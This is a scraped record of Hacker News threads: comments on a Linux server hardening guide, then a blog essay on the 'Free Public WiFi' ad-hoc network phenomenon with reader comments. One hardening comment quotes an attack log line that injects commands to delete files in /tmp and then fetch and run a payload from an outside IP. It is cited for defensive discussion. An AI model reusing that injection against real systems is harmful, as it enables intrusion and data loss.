that don't meaningfully increase security.Don't bother setting up a user account, use a public key authorized SSH session as root to do everything. Setting up UFW to block everything but what you should be serving is good. I don't see much point in things like Wireguard or this umask thing.replythaumiel 8 hours ago | parent | next [–] What should one do when that is not possible to handle the servers as cattle, because there is 200 unique servers which different people has to connect to and do different things with, like a university or other academic places?replyawestroke 5 hours ago | root | parent | next [–] Hire sysadminsreplygus_ 6 hours ago | prev | next [–] > GET /shell?cd+/tmp;rm+-rf+*;wget+ 107.6.255.231/jaws;sh+/tmp/jawsin the case of a successful attack, some questions to ask could be:- why did they manage to use wget?- why {apache,nginx,postfix,exim,sendmail,...} is allowed to use wget, or curl, or nc or bash (or ...)?- why is wget, curl, nc, telnet, .. installed on the server? can they be uninstalled? with (!!) if it's a container.- why did they manage to execute files from /tmp, or /var/tmp, or /dev/shm? do these directories need write access for \"others\" or can they be mounted with \"noexec\"?- ufw/iptables/nftables won't stop local binaries from opening outbound connections, how would you stop outbound connections by binary, path, etc?- if they managed to wipe the logs, how could you have known all the commands they executed? could auditd+grafana (just an example) have helped here by sending logs to a remote server?replyTacticalCoder 2 hours ago | parent | next [–] I agree with your questions to be asked if an attack succeeds but...> ufw/iptables/nftables won't stop local binaries from opening outbound connectionsWait... Of course iptables/nftables can be used to prevent anything local from opening outbound connections. You can, say, easily have a firewall which only allows \"NEW\" traffic to be inbound traffic on either port 22 or 443.They're called stateful firewalls for a reason.For example on Debian you could configure the firewall so that the only user allowed to emit new traffic to get updates is the (/nonexistent:/user/sbin/nologin) user \"_apt\".And for all those (not you) talking about the \"cattle vs pet\" thing, all this can be automated by hardening scripts you run exactly once, once you set up the server.It's not because there are guides out there that every step in these guides have to be done manually, each time you configure a new server.replypolitelemon 19 hours ago | prev | next [–] > If you’re on Windows, PuTTYgen should workIf you're on Windows you can `wsl --install` and work with Linux (eg Ubuntu 2204).You can also install Git Bash which comes with ssh and ssh-keygen.Either way , same instructions.replycjcampbell 19 hours ago | parent | next [–] And on up-to-date versions, OpenSSH client and tools are available from powershell or cmd.replypxc 18 hours ago | root | parent | next [–] You can also install the Microsoft port of OpenSSH on older versions yourself.replyuser3939382 2 hours ago | prev | next [–] I’d learn to run OpenSCAP with CIS and the NIST CSF to get an idea of secure operations. The former can detect and remediate a lot of the issues these types of guides are discussing.But really the idea of being successful at anything while also having no knowledge of it is kind of a farcical contradiction.It’s like saying, look, I just want to build a rocket engine. Tell me how without all the physics mumbo jumbo.replyJohnCClarke 3 hours ago | prev | next [–] The first rule of sysadmin: Have a regular schedule for testing your offsite backups of all your systems.After that, as others have noted, create and review a threat model and use that to guide your hardening based on official guides:https://www.debian.org/doc/manuals/securing-debian-manual/and here's a readable introduction to the NIST STIGs:https://cybergladius.com/nist-server-hardening-best-practice...replypid-1 10 hours ago | prev | next [–] Sysadmin isn't a profession you choose, it's something that happens to your life.replyeb0la 4 hours ago | parent | next [–] Except I choose it, then moved on later in life ;-)replyteekert 14 hours ago | prev | next [–] I’m a biologist and also a reluctant sysadmin. I’m happy to see I do roughly the same [0] except that I use an ed25519 ssh key and switched to Tailscale (it’s just too easy). I only open “unsafe” ports on the tailnet.I did just install my first NixOS system so I’m indeed heading towards full automation.[0] https://blog.hmrt.nl/posts/first_steps_arch_box/replynunez 13 hours ago | parent | next [–] Tailscale is so good. One of the best pieces of software I've used in a long time. It just works, and it's really good at what it does (VPNs into your private network, regardless of the route to it)replyDyslexicAtheist 17 hours ago | prev | next [–] securing from what? this thing is pointless mid-90ies advise without a threat-model.replythewanderer1983 16 hours ago | parent | next [–] This guy gets it. Your first question should be around your threat model. Are you protecting against random scans and script kiddies or the various APTs?Maybe then look at the MITRE ATT&CK framework, Cyber Kill Chain etc.I really hate to suggest them as it appears they have deviated in weirds ways from their original goal of protecting critical infrastructure from cybersecurity attacks, but CISA has many relevant documents.replythr0waway001 15 hours ago | prev | next [–] Reluctant sysadmin: story of my life.Over the last 3 years I have gone from being a timid junior web dev to reluctantly and hastily having to be the guy managing the Linux web servers and keeping the operation running and being hardened along the way.On the one hand, the huge salary increase has been nice but on the other hand I am constantly thinking one day I'm gonna fuck it all up. I feel like I'm not doing this job any justice and that I'm way out of my element all the time.I try to get better by reading blog posts like this and documentation and asking for advice but I just feel like an impostor all the time.But employers are happy with the results and I guess that makes it tolerable.So thanks for these types of guides!replyacumenical 4 hours ago | prev | next [–] This notion of security is stale. Real security is far more complex than this, requiring automated provisioning and logging. This is more suitable for a VPS or a personal VM than anything professional. Also installing acl just to use setfacl bothered me.replybawolff 3 hours ago | prev | next [–] I don't get why a wireguard vpn to connect to ssh would be any better than just ssh directly (assuming reasonable ssh config)replysmarkov 1 hour ago | parent | next [–] You can put SSH on a different port but it can still be found through port scanning and poked at. Figuring out whether Wireguard is running at all or which port it's on is, from my understanding, very much not a trivial task if possible at all from the outside. This extra layer prevents attackers from even getting a chance at poking around with SSH.replySparkyte 18 hours ago | prev | next [–] Meh, just do it like me get hardened image and container. Deploy stuff as a gold image without elevated permissions and or container. Then just make sure everything is behind a proxy or intelligent load balancer that restricts any crazy input.DONT OVERCOMPLICATE WORKOvercomplicating work means slower response times to solving problems.replyr3n 7 hours ago | prev | next [–] Is there a guide to teach these reluctant sysadmins how to evaluate, plan, and choose between all these different methods ?For me, I find the hardest part of securing systems are usually to decide what is good enough for the current situation.replykbar13 8 hours ago | prev | next [–] trying my best to understand the target audience for this blog post. It feels like most of these things fall somewhere in between \"a sysadmin should know this\" and \"this might be new to a dev without much ops experience\". And then, my first thought is, well if you're focused on getting software out the door your best bet is not to touch any of this stuff and deploy on a platform where configuring the Linux distro is not your responsibility. i.e. k8s or AWS ECSreplyoptimalsolver 6 hours ago | prev | next [–] No Fail2ban?replyegberts1 1 hour ago | parent | next [–] Too many attack surface vectors (from within the Linux/glibc/bash)?replynunez 13 hours ago | prev | next [–] WireGuard is fine, but since it's only UDP, it doesn't work well if you're connecting behind a restrictive firewall or from a network using CGNAT (many of them).If you're a reluctant sysadmin that doesn't care, I'd recommend using Tailscale. It's wireguard without the drama, is extremely competent at piercing through almost any firewall [0], and has a great ACL system that lets you fine tune which accounts can access what.It's also free (for now)![0] https://tailscale.com/blog/how-nat-traversal-works/replymmsc 19 hours ago | prev | next [–] I like the changing of the default umask, although it probably shouldn't be 077.Is acl needed over, say, chown?replyaesh2Xa1 19 hours ago | parent | next [–] No, there's no need to use `setfacl` over `chown/chmod` in the author's example.The reason that the author uses umask 077 and ACLs is, I think, just a mindset. By using 077, the file is restricted to only the owner, and the sysadmin does not need to think about group memberships. By extending read access using an ACL, this theme is continued; additional usernames will be appended as ACLs, but no group set of usernames needs to exist.A file named \"alfred\" would, presumably, only ever needed to be read by root and alfred, but that's just the narrow case for the author's scheme.replycutler 19 hours ago | parent | prev | next [–] If not 077 then what?replylinuxdude314 18 hours ago | root | parent | next [–] 077 is a bit too restrictive for a lot of workloads. 027 is recommended by CIS for servers and 022 for desktop.If you are sure you can use 077 without stuff breaking, awesome, but that's not always the case. Typically on systems using 077 you will find yourself using chmod a lot.replychris_st 19 hours ago | parent | prev | next [–] Why not 077?reply_el 11 hours ago | prev | next [–] It's definitely neat to know how these things work on a Linux server, but most of this advice doesn't make sense for an EC2 instance. You should be using security groups instead of UFW (indeed the article mentions this). You don't need to configure SSH access because SSM session manager exists, which also makes the WireGuard setup superfluous, too.replyjesprenj 15 hours ago | prev | next [–] > You should not log in directly as root.Why not?replykccqzy 11 hours ago | parent | next [–] I see this as mostly a way to prevent fat finger mistakes on the part of the sysadmin. Most of the tasks that need to be done when interactively logging in don't really require root per se. Why give yourself so much ambient permissions then? If I accidentally issue a command that only root can execute, it is a chance to reflect when repeating the command with sudo and typing the password.replyandai 17 hours ago | prev | next [–] Wouldn't it be easier to use OpenBSD?replycookiengineer 9 hours ago | parent | next [–] OpenBSD don't even have security advisories like most other distros have. [1]So I'd argue it's impossible to build a correct threat model if all your vulnerabilities are expressed on code-level, rather than on \"what software\" or \"what packages\" are affected by it.[1] https://www.openbsd.org/errata73.htmlreplyrs_rs_rs_rs_rs 17 hours ago | parent | prev | next [–] Nice try.replybadrabbit 8 hours ago | prev [–] Run lynis and linpeas!!!Also, setup auditd and rsyslog forwarding. Backup anything important.reply",
    "originSummary": [
      "\"The Reluctant Sysadmin's Guide to Securing a Linux Server\" is a step-by-step guide for securing a Linux server.",
      "It is geared towards individuals who are not experienced sysadmins.",
      "The guide covers essential topics like updating software, creating user accounts, and disabling root logins.",
      "It also provides instructions on configuring SSH keys, using WireGuard for VPN, and setting up a firewall.",
      "The article emphasizes the importance of automation for maintaining system security.",
      "It offers suggestions for simplifying the initialization process."
    ],
    "commentSummary": [
      "The discussions focus on securing a Linux server from various perspectives.",
      "Topics discussed include server configuration, VPN and SSH access, cloud platform security, disaster recovery plans, choice of operating system, and implementation of security tools.",
      "Suggestions are given for hardening the server and using specific tools for security.",
      "The importance of strong server security measures is emphasized, as well as the role of sysadmins in managing and securing the server."
    ],
    "points": 289,
    "commentCount": 89,
    "retryCount": 0,
    "time": 1690739953
  },
  {
    "id": 36937571,
    "title": "Free Public WiFi",
    "originLink": "https://computer.rip/2023-07-29-Free-Public-WiFi.html",
    "originBody": "_____ ___________ _| |___ _____ ___ _ _| |_ ___ ___ ___ |_|___ ___ | __|___ _| | | --| . | | . | | |_| -_|_|_ -|| |_| -_|| __ -| .'| . | |_____|___|_|_|_|_|___|_| |___|_| |___||__|__|_| |___||_____|__,|___| a newsletter by |_| j. b. crawford home archive subscribe rss>>> 2023-07-29 Free Public WiFiRemember Free Public WiFi?Once, many years ago, I stayed on the 62nd floor of the Westin Peachtree Plaza in Atlanta, Georgia. This was in the age when the price of a hotel room was directly correlated with the price of the WiFi service, and as a high school student I was not prepared to pay in excess of $15 a day for the internet. As I remember, a Motel 6 that was not blocks away but within line of sight ended up filling the role. But even up there, 62 floors from the ground, there was false promise: Free Public WiFi.I am not the first person to write on this phenomenon, I think I originally came to understand it as a result of a 2010 segment of All Things Considered. For a period of a few years, almost everywhere you went, there was a WiFi network called \"Free Public WiFi.\" While it was both free and public in the most literal sense, it did not offer internet access. It was totally useless, and fell somewhere between a joke, a scam, and an accident of history. Since I'm not the first to write about it, I have to be the most thorough, and so let's start out with a discussion of WiFi itself.The mid-2000s were a coming of age era for WiFi. It had become ubiquitous in laptops, and the 2007 launch of the iPhone established WiFi as a feature of mobile devices (yes, various phones had offered WiFi support earlier, but none sold nearly as well). Yet there weren't always that many networks out there. Today, it seems that it has actually become less common for cafes to offer WiFi again, presumably as LTE has reached nearly all cafe customers and fewer people carry laptops. But in the 2010s, genuinely free, public WiFi had become far more available in US cities.Some particularly ambitious cities launched wide-area WiFi programs, and for a brief time \"Municipal WiFi\" was a market sector. Portland, where I grew up, was one of these, with a wide-area WiFi network covering the house I grew up in for a couple of years. Like most the program didn't survive to see 2020. Ironically, efforts to address the \"digital divide\" have lead to a partial renaissance of municipal WiFi. Many cities now advertise free WiFi service at parks, libraries, and other public places. I was pleased to see that Mexico City has a relatively expansive municipal WiFi service, probably taking advantage of the municipal IP network they have built out for video surveillance and emergency phones.The 2000s, though, were different. \"Is there WiFi here?\" was the sort of question you heard all the time in the background. WiFi was seen as a revenue source (less common today, although the hotel industry certainly still has its holdouts) and so facility-offered WiFi was often costly. A surprising number of US airports, for example, had either no WiFi or only a paid service even through the 2010s. I'm sure there are still some like this today, but paid WiFi seems on the way out [1], probably as a result of the strong competition it gets from LTE and 5G. The point, though, is that back in 2006 we were all hungry for WiFi all the time.We also have to understand that the 802.11 protocol that underlies WiFi is surprisingly complex and offers various different modes. We deal with this less today, but in the 2000s it was part of computer user consciousness that WiFi came in two distinct flavors. 802.11 beacon packets, used to advertise WiFi networks to nearby devices, include a flag that indicates whether the network operates in infrastructure mode or ad-hoc mode.A network in infrastructure mode, basically the normal case, requires all clients to communicate with the access point (AP). When two clients exchange traffic, the AP serves as an intermediary, receiving packets from one device and transmitting them to the other. This might at first seem inefficient, but this kind of centralization is very common in radio systems as it offers a simple solution to a complex problem. If a WiFi network consists of three devices, an AP and two clients (A and B), we know that clients A and B can communicate with the AP because they are maintaining an association. We don't know if A and B can communicate with each other. They may be on far opposite sides of the AP's range, there may be a thick concrete wall between A and B, one device may have very weak transmit power, etc. Sending all traffic through the AP solves this problem the same way a traditional radio repeater does, by serving as an intermediary that is (by definition for an AP) well-positioned in the network coverage area.The other basic WiFi mode is the ad-hoc network. In an ad-hoc network, devices communicate directly with each other. The main advantage of an ad-hoc network is that no AP is required. This allowed me and a high school friend to communicate via UnrealIRCd running on one of our laptops during our particularly engaging US Government/Economics class (we called this \"Governomics\"). The main disadvantage of ad-hoc networks is that the loss of a central communications point makes setup and routing vastly more complicated. Today, there is a much better established set of technologies for distributed routing in mesh networks, and yet ad-hoc WiFi is still rare. In the 2000s it was much worse; ad-hoc mode was basically unusable by anyone not ready to perform manual IP address management (yes, link local addresses existed and we even used them for our IRC client configurations, but most people evidently found these more confusing than helpful).In general, ad-hoc networks are a bit of a forgotten backwater of consumer WiFi technology. At the same time, the promise of ad-hoc networks featured heavily in marketing around WiFi, compelling vendors to offer a clear route to creating and joining them. This has allowed some weird behaviors to hang around in WiFi implementations.Another thing about WiFi networks in the 2000s, and I swear this is all building to a point, is that the software tools for connecting to them were not very good. On Windows, WiFi adapter vendors distributed their own software. Anyone with a Windows laptop in, say, 2005 probably remembers Dell QuickSet Wireless, Intel PROSet/Wireless (this actually how they style the name), and Broadcom WLAN Utility. The main thing that these vendor-supported wireless configuration utilities shared was an astounding lack of quality control, even by the standards of the time. They were all terrible: bizarre, intrusive, over-branded UX on top of a network configuration framework that had probably never worked reliably, even in the original developer's test environment.Perhaps realizing that this hellscape of software from hardware companies was undoubtedly having a negative impact on consumer perception of Windows [2], Microsoft creaked into action. Well, this part is kind of confusing, in a classically Microsoft way. Windows XP had a built-in wireless configuration management utility from the start, called Wireless Zero Configuration. The most irritating thing about the vendor utilities was that they were unnecessary; most of the time you could just uninstall them and use Wireless Zero and everything would work fine.Wireless Zero was the superior software too, perhaps because it had fewer features and was designed by someone with more of the perspective of a computer user than a wireless networking engineer. Maybe I'm looking on Wireless Zero with rose-colored glasses but my recollection is that several people I knew sincerely struggled to use WiFi. The fix was to remove whatever garbage their network adapter vendor had provided and show them Wireless Zero, where connecting to a network meant clicking on it in a list rather than going through a five-step wizard.So why did the vendor utilities even exist? Mostly, I think, because of the incredible urge PC vendors have to \"add value.\" Gravis, in the context of \"quick start\" operating systems, gives a good explanation of this phenomenon. The problem with being a PC vendor is that all of the products on the market offer a mostly identical experience. For vendors to get any competitive moat bigger than loud industrial design (remember when you badly wanted a Vaio for the looks?), they had to \"add value\" by bolting on something they had developed internally. These value-adds were, almost without exception, worthless garbage. And wireless configuration utilities were just another example, a way for Intel to put their brand in front of your face (seemingly the main concern of Intel R&D to this day) despite doing the same thing everyone else did.There was a second reason, as well. While it was a good fit for typical consumer use, Wireless Zero was not as feature-complete as many of the vendor utilities were. Until the release of Vista and SP3, Wireless Zero was basically its own proprietary solution just like the vendor utilities. There was no standard API to interact with wireless configuration on XP/SP1/2, so if a vendor wanted to offer anything Zero couldn't do, they had to ship their whole own Product. Microsoft's introduction of a WiFi config API in Vista (and basically backporting it to SP3) was a big blow to proprietary wireless utilities, but it probably had less of an impact than the general decline of crapware in Vista and later.This is not to say that they're gone. A surprising number of PCs still ship with some kind of inane OEM software suite that offers a half-baked wireless configuration utility (just a frontend on the Windows API) alongside the world's worst backup service, a free trial offer for a streaming service you haven't heard of but represents the death throes of a once great national cable network, and something that tells you if your PC is \"healthy\" based on something about the registry that has never and will never impact your life??? God how is the PC industry still like this [3].I think I have adequately set the stage for our featured story. In the late 2000s, huge numbers of people were (a) desperately looking for a working WiFi network even though they were in a place like an airport that should clearly, by civilized standards, have a free one; (b) using Wireless Zero on XP/SP1/2; and (c) in possession of only a vague understanding of ad-hoc networks which were nonetheless actively encouraged by WiFi vendors and their software.Oh, there is a final ingredient: Wireless Zero had an interesting behavior around ad-hoc networks. It's the kind of thing that sounds like an incredibly bad decision in retrospect, but I can see how Microsoft got there. Let's say that, for some reason and some how, a consumer uses ad-hoc WiFi. It was ostensibly possible, not even really that hard, to use ad-hoc WiFi to provide internet access in a home (from e.g. a USB DSL modem, still common at the time). It's just that the boxes you had to check were enough clicks deep in the network control panel that I doubt many people ever got there.One of the problems with ad-hoc WiFi, though, is that ad-hoc networks can be annoying to join. You've got to enter the SSID and key, which is already bad enough, but then you're going to be asked if it's WEP or WPA or WPA2 and then, insult on injury, if the WPA2 is in TKIP or AES mode. For ad-hoc networks to be usable something had to broadcast beacons, and without an AP, that had to be the first computer in the network.So, now that you have your working ad-hoc setup complete with beacons, you might want to take your laptop, unplug it from the DSL modem, and take it somewhere else. Maybe you go on a trip, use the WiFi at a hotel (probably $15 a day depending on your WORLD OF HYATT status), then come back home and plug things back in the way they were. You would expect your home internet setup to pick up where you left off, but people didn't have as many devices back then and especially not as many always-on. Your laptop, de facto \"host\" of the ad-hoc network, may be the only network participant up and running when you want to connect a new device. So what does it need to do? Transmit beacons again, even though the network configuration has changed a few times.The problem is that it's really hard for a system in an ad-hoc network to know whether or not it should advertise it. Wireless Zero didn't really provide any way to surface this decision to the user, and the user probably wouldn't have understood what it meant anyway. So Microsoft took what probably seemed, in the naivety of the day, to be a reasonable approach: once a Windows XP machine had connected to an ad-hoc network, it \"remembered\" it the same way it did the \"favorite\" networks, for automatic reconnection. Assuming that it might just be the first device in the ad-hoc network to come up, if the machine had a remembered ad-hoc network and wasn't associated with anything else, it would transmit beacons.Put another way, this behavior sounds far more problematic: if a Windows XP machine had an ad-hoc network favorited (which would be default if it had ever connected to one), then when it wasn't connected to any other WiFi network, it would beacon the favorited ad-hoc network to make it easier for other hosts to connect. Ad-hoc networks could get stuck in there, a ghost in Wireless Zero.You can no doubt see where this goes. \"Free Public WiFi\" was just some ad-hoc network that someone created once. We don't know why; most people seem to go to ill intent but I don't think that's necessary. Maybe some well-meaning cafe owner had an old computer with a USB DSL modem they used for Business and decided to offer cafe WiFi with the hardware they already owned. The easiest way (and probably only way, given that driver support for infrastructure mode AP behavior on computer WiFi adapters remains uneven today) would be to create an ad-hoc network and check the right boxes to enable forwarding. But who knows, maybe it was someone intercepting traffic for malicious purposes, maybe it was someone playing a joke, all we really know is that it happened sometime before 2006 when I find the first public reference to the phenomenon.Whoever it was, they were patient zero. The first Windows XP machine to connect became infected, and when its owner took it somewhere else and didn't connect to a WiFi network, it helpfully beaconed Free Public WiFi. Someone else, seeing such a promising network name, connected. Frustrated by the lack of Hotmail access, they disconnected and moved on... but, unknowingly, they were now part of The Ad-Hoc Network.The phenomenon must have spread quickly. In 2007, a wire service column of security tips (attributed to the Better Business Bureau, noted information security experts) warns that \"this network may be an ad-hoc network used by hackers hunting for credit card information, Social Security numbers and account passwords.\" Maybe! Stranger things have happened! I would put good money on \"no\" (the same article encourages using a VPN, an early link in a chain that leads to the worst YouTube content today).By 2008-2009, when I think I had reached a high level of owning a laptop and using it in strange places, it was almost universal. \"Free Public WiFi\" enchanted me as a teenager because it was everywhere. I could hardly open my laptop without seeing it there in the Wireless Zero list. Like the Morris worm, it exploited a behavior so widespread and so unprotected that I think it must have burned through a substantial portion of the Windows XP laptop fleet.\"Free Public WiFi\" would reach an end. In Service Pack 3, as part of the introduction of the new WLAN framework, Microsoft fixed the beacon behavior. This was before the era of forced updates, though, and XP was particularly notorious for slow uptake of service packs. \"Free Public WiFi\" was apparently still widespread in 2010 when NPR's mention inspired a wave of news coverage. Anecdotally, I think I remember seeing it into 2012. One wonders: is it still around today?Unfortunately, I always have a hard time with large-scale research on WiFi networks. WiGLE makes a tantalizing offer of an open data set to answer this kind of question but the query interface is much too limited and the API has a prohibitively low quota. Maxing out my API limits every day I think it'd take over a month to extract all the \"Free Public WiFi\" records so that I could filter them the way I want to. Perhaps I should make a sales inquiry for a commercial account for my enterprise blogging needs, but it's just never felt to me like WiGLE is actually a good resource for the security community. They're kind of like hoarders, they have an incredible wealth of data but they don't want to give any of it up.I pulled the few thousand records I'm allowed to get today from WiGLE and then changed tracks to WifiDB, which is much less known than WiGLE but actually makes the data available. Unfortunately WifiDB has a much lower user count, and so the data is clearly impacted by collection bias (namely the impressive work of one specific contributor in Phoenix, AZ).Still, I can find instances of ad-hoc \"Free Public WiFi\" spanning 2006 to as late as 2018! It's hard to know what's going on there. I would seriously consider beaconing \"Free Public WiFi\" today as a joke, but it may be that in 2018 there was still some XP SP2 laptop in the Phoenix area desperately hoping for internet access.WifiDB data, limited though it is, suggests that The Ad-Hoc Network peaked in 2010. Why not a crude visualization?20061 | 20070200839||||| 200982||||||||| 201093|||||||||| 201120||| 20122 | 20130 20141 | 20155 || 20163 | 20172 | 20181 | That 2006 detection is the first, which lines up with NPR's reporting, but could easily also be an artifact of WifiDB's collection. And 2018! The long tail on this is impressive, but not all that surprising. XP had a real reputation for its staying power. There are surely still people out there that hold that XP was the last truly good Windows release---and honestly I might be one of them. Every end-of-life announcement for XP triggered a wave of complaints in the industry rags. In 2018, some niche versions of XP (e.g. POSReady) were still under security support!Most recent observations of \"Free Public WiFi\" are actually infrastructure-mode networks. It's an amusing outcome that \"Free Public WiFi\" has been legitimized over time. In Bloomington, Indiana I think it's actually the public WiFi at a government building. Some office buildings and gas stations make appearances. \"Free Public WiFi\" is probably more likely to work today than not... but no guarantee that it won't steal your credit card. Pay heed to the Better Business Bureau and take caution. Consider using a VPN... how about a word from our sponsor?Postscript: I have been uploading some YouTube videos! None of them are good, but check it out. I'm about to record another one, about burglar alarms.[1] Paid WiFi still seems alive and well at truck stops. Circumstances on a recent cross-country trip lead to me paying an outrageous sum, something like $20, for one day of access to a nationwide truck stop WiFi service that was somewhere between \"completely broken\" and \"barely usable to send an email\" at the three successive TAs I tried at. My original goal of downloading a several-GiB file was eventually achieved by eating at a restaurant proximate to a Motel 6. Motel 6 may be the nation's leading municipal WiFi operator.[2] Can we think of another set of powerful hardware vendors consistently dragging down the (already questionably seaworthy) Windows ecosystem by shipping just absolute trash software that's mandatory for full use of their hardware? Companies that are considered major centers of computer innovation yet distribute a \"driver\" as an installer for an installer that takes over a minute just to install the installer? Someone with the gall to call their somehow even less stable release branch \"ADRENALINE EDITION\"?[3] I used to have a ThinkPad with an extra button that did nothing because Lenovo decided not to support the utility that made it do things on Vista or later. This laptop was sold well after the release of Vista and I think shipped with 7. That situation existed on certain ThinkPad models for two generations. Things like this drive you to the edge of the Apple Store I swear, and Lenovo isn't as bad as some. sincerely,j. b. crawfordme@computer.ripMe, elsewhere: Cohost, Pixelfed, YouTubeThis website is begrudgingly generated by the use of software. Letters to the editor are welcome via facsimile to +1 (505) 926-5492 or mail to PO Box 26924, Albuquerque, NM 87125.",
    "commentLink": "https://news.ycombinator.com/item?id=36937571",
    "commentBody": "Free Public WiFi (computer.rip)273 points by EamonnMR 14  120 commentsculi 1 hour ago | next [–] Today, McDonald's, of all places, is actually the best place to get free wifi that's actually fast. They're quite committed to the goal of wifi in every locale and obviously they're everywhereAdditionally, certain grocery stores like Sprouts will often place the employee break area in the front of the store so customers can also hang out. There's outlets, a microwave, and free wifi. You'll sometimes have to ignore an annoying TV playing the same 4 commercials on a loopreplyitake 1 hour ago | parent | next [–] I used Sprouts and McD almost every week as a low cost coworking. The McD coffee is like 30% the price of Starbucks, but I find the Starbucks wifi to be more reliable.replybigwheeler 1 hour ago | root | parent | next [–] Somehow the McD coffee is better too.replyBolexNOLA 38 minutes ago | root | parent | next [–] I am far from the coffee snob, but Starbucks genuinely taste burned to me. And I know that’s not a hot take, it’s a pretty common line you’ll hear when people are critiquing it. But it is also repeated with good reason.replyRankingMember 17 minutes ago | root | parent | next [–] My opinion as well unless we're talking their \"Blonde Roast\", which is somehow decent despite Starbucks' apparent burnt-flavor bias.I think the reason Starbucks stays afloat is not their coffee, but their 900 calorie \"coffee drinks\", which they market such that people can pretend to be coffee snobs while drinking what are essentially milkshakes.replyZigurd 11 minutes ago | root | parent | prev | next [–] Not that I refuse it when having a Mcbreakfast on the road, but there's this weird taste of ashtray in McDonald's coffee.replyantisthenes 34 minutes ago | root | parent | prev | next [–] Glad to hear I'm not the only one.I'll take the consistency of McD coffee over almost any other establishment.And given their traffic volume, it's almost always guaranteed to be fresh, at a fraction of the cost of coffee-centric cafes.replyScoundreller 1 hour ago | parent | prev | next [–] The global consistency of some of these franchises really comes in handy. Same with usually knowing that a Starbucks or McDonalds in Country C will have free relatively-barrierless bathrooms in places where that’s often not a thing.replyreaperducer 48 minutes ago | root | parent | next [–] The global consistency of some of these franchises really comes in handy.That was always the secret to McDonald's success.There were plenty of hamburger joints along America's roadways when McDonald's started. But what McDonald's did is to provide a consistent experience.The food may or may not not have been as good, but you knew exactly what to expect, which was a massive improvement over the way it was before when the price, quality, service and other things varied widely.I heard a program about it on the radio several decades ago, and there's an entire economic theory about it, and it's the basis of modern franchising.replymyself248 1 hour ago | root | parent | prev | next [–] Ditto with the menus. If someone has dietary needs and they don't know names of all the ingredients in the local language, they're likely to end up at a global chain.replyrsynnott 39 minutes ago | root | parent | next [–] The EU _nearly_ solved this (or at least solved for 99% of cases) by mandating 14 allergens (or, well, problem ingredients; gluten and dairy are more likely to be intolerance issues than actual allergies) which must be declared. They then fumbled this by not specifying a canonical ordering; number 7 is _usually_ dairy, say, but the ordering is not actually mandated. So you still need to know the local language.(My personal favourite quirky use of the fact that there is no mandated order is by a Kosher deli in Dublin; they don't have numbers for dairy, crustaceans or mollusks because, well, it's Kosher so I suppose it can be assumed. They use the free'd-up address space to call out wheat, rye, barley and oats, which is going beyond the obligation; these can all be grouped together).replygiovannibonetti 1 hour ago | prev | next [–] One thing that bothers me about Free Wifi nowadays is traffic shaping. Here in Latin America, it is very common to have internet fast lanes dedicated to WhatsApp, when Telegram is unusable in the same connection. I notice sometimes I'm connected to a public wifi and Telegram stops working, then if I disconnect and go back to the mobile carrier it suddenly is back and alive.replytoastal 10 hours ago | prev | next [–] I remember that time before I had a smart phone, but while I had a laptop & before there was security concerns to bother password protecting WiFi access points. I used to stop by roadside hotels/motels & whip out the laptop to do any on-the-go research since it was free & I didn’t yet have a taste for coffee (or the money) to want to stop by a café. The other highlight was using SMS/MSS via email & doing $NUMBER@verzion.net or whatever the address was. The SMS rates were high & I was always carrying my laptop & usually could nab open WiFi somewhere.--Other WiFi-related anecdote is my Fujifilm camera (RIP capacitor) chose to do its app communications between camera & smart phone over WiFi. I’m assuming this was a range thing, but it was interesting being in the wilderness & joining a LAN to get remote control.replyJD557 9 hours ago | parent | next [–] I had completely forgot about sending MMS via mail! (Not Verizon, but my provider had a similar thing)If I recall, some times the message would be delayed by quite a while, so it was not a reliable replacement for SMS, but still fun (and would allow me to send data from my PC to my phone).Thanks for the memoriesreplyhousemusicfan 7 hours ago | root | parent | next [–] I used it until recently but carrier spam filtering has become so aggressive out of necessity, that message delivery is intermittent to unusable. As usual, spammers have ruined everything and this is why we can't have nice things.replypests 8 hours ago | root | parent | prev | next [–] Did you ever get a text on a landline? Startled me the first time - some 90s era robotic voice reading it out.replydools 5 hours ago | root | parent | next [–] The only time this happened to anyone I know was around 2005. I sent a txt to my brother and accidentally used his landline number and he picked up the phone and a robot voice said “I left your jacket at the Grampians” and then disconnected. Such a useless piece of tech!replykotaKat 1 hour ago | root | parent | prev | next [–] Tom Baker used to be the voice used on British Telecom for a time.Imagine accidentally sending a text to the wrong number and getting a dirty phone call from Dr. Who at 2 in the morning...replyjesprenj 3 hours ago | root | parent | prev | next [–] In Slovenia I remember having had a \"smart\" landline phone in ~2009 that could send and receive SMS. ISDN?replytoastal 7 hours ago | root | parent | prev | next [–] I did it out of necessity to save money. The delay was real, & I’m surprised dates tolerated it from me.Later, I only had a minimal data plan (cheaper than with voice+SMS) + Google Voice & some forwarding app. I remember rushing from a Taco Bell $2 meal deal to a friend’s to take a job interview call after an email so I had enough data to actually finish out the interview.Frugal times.replyprmoustache 3 hours ago | root | parent | next [–] > The delay was real, & I’m surprised dates tolerated it from me.Communications in general were much more asynchronous back in the days and people would just call if immediate attention was needed.replyScoundreller 9 hours ago | prev | next [–] > This was in the age when the price of a hotel room was directly correlated with the price of the WiFi serviceThat's odd. I used to feel that the price of wifi in hotels was inversely correlated with the hotel room price.replygumby 9 hours ago | parent | next [–] Strangely, in the US at least, the cheap hotels would have free or low cost WiFi while the upscale places charged an arm and a leg.replybboygravity 7 hours ago | root | parent | next [–] Yet, it causes \"the pain of paying\" and micro-transactions in general go directly against common sense and general marketing ideas of building a luxury/exclusive hassle-free feeling brand.Especially since the payment process at those upscale hotels often was/is seperate from the room-paying process and was a total hassle (making an account through some crappy GUI, entering credit card details manually, etc).It definitely felt super cheap and greedy to me when I stayed in those up-scale hotels for work and wanted to use wifi.replysilasdavis 7 hours ago | root | parent | next [–] Yes I will never forget or forgive being forced submit my details to some Marriot bonvoy spam club in order to qualify for free WiFi in an expensive US hotel where I was staying for a conference. It was otherwise a manual daily payment via a broken portal of fifteen dollars. The cost of roaming mobile data in the US (from the UK, at the time) was completely absurd so they had me over a barrel for the hour or so connectivity I needed from the hotel per day to check in with work.They wouldn't/couldn't just add it to my room invoice either so I would have had to manually pay on a personal card, and expense each day. From memory the portal did not accept my card on the first try either.I'll take my boycott of them for this slight to my grave.Are mid-range businessy hotels really working with such slim margins that its worth alienating customers like this?replyBeFlatXIII 1 hour ago | root | parent | prev | next [–] > for workThat’s the leading hypothesis: those hotels court business travelers who will have someone else foot the bill.replymbg721 1 hour ago | root | parent | next [–] I had heard the explanation at one point that pricey hotels were the first to adopt wi-fi systems and locked themselves into expensive long-term contracts, so they were still trying to recoup the costs even as the tech got cheaper and more widespread. I guess it's been long enough now that that wasn't the real 